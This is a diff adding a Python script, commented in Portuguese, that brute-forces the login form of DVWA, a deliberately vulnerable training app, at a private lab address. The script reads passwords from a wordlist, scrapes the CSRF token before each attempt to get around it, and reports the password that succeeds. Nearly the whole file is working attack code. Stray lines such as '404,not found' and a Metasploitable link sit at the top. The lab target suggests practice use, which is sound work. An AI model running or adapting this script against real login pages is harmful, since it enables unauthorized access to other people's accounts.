@@ -1,0 +1,51 @@
+404,not found
+405,Method Not Allowed
+ https://sourceforge.net/projects/metasploitable/
+import requests
+
+# Configurações
+url = "http://192.168.56.101/dvwa/login.php"  # URL do alvo (DVWA, por exemplo)
+usuario = "admin"                             # Nome de usuário alvo
+wordlist_path = "senhas.txt"                 # Arquivo com lista de senhas
+login_data_template = {
+    "username": usuario,
+    "password": "",
+    "Login": "Login"  # Pode mudar de acordo com o nome do botão no HTML
+}
+
+# Iniciar sessão para manter cookies
+sessao = requests.Session()
+
+# Bypass CSRF (DVWA tem isso)
+def get_token():
+    resposta = sessao.get(url)
+    if "user_token" in resposta.text:
+        import re
+        token = re.search(r'name="user_token" value="(.*?)"', resposta.text).group(1)
+        return token
+    return None
+
+# Função de força bruta
+def forca_bruta():
+    with open(wordlist_path, "r") as f:
+        for linha in f:
+            senha = linha.strip()
+            print(f"[*] Testando senha: {senha}")
+
+            token = get_token()
+            dados = login_data_template.copy()
+            dados["password"] = senha
+            if token:
+                dados["user_token"] = token
+
+            resposta = sessao.post(url, data=dados)
+
+            if "Login failed" not in resposta.text:
+                print(f"[+] Senha encontrada: {senha}")
+                return senha
+
+    print("[-] Nenhuma senha da lista funcionou.")
+    return None
+
+# Executar
+forca_bruta()
